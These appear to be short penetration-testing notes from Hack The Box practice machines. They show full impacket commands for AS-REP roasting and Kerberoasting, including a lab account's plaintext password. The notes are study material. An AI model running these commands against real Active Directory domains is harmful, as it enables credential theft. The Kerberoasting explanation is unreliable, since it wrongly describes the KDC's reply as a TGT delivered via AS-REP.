## impacket-GetNPUser
When a target has Kerberos running and usernames are identified, the very next thing I can try is AS_REP with a "Do not Require Keberos Preauthentication" attack. This option does not require a password to be supplied.
```
└─$ impacket-GetNPUsers  htb/ -dc-ip 10.10.10.161 -usersfile ./valid_users.txt -request -format john -no-pass
```

## impacket-GetUserSPNs
 The tester used retrived credential to request SPN to KDC. The KDC verified the credential and returned TGT (AS-REP). And the TGT contains user's identification which is encrytyped with KDC secret key. The tester decrypted the krb5tgs using john and rockyou.txt.

```
└─$ impacket-GetUserSPNs  active.htb/svc_tgs    

└─$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile outputTGS.txt

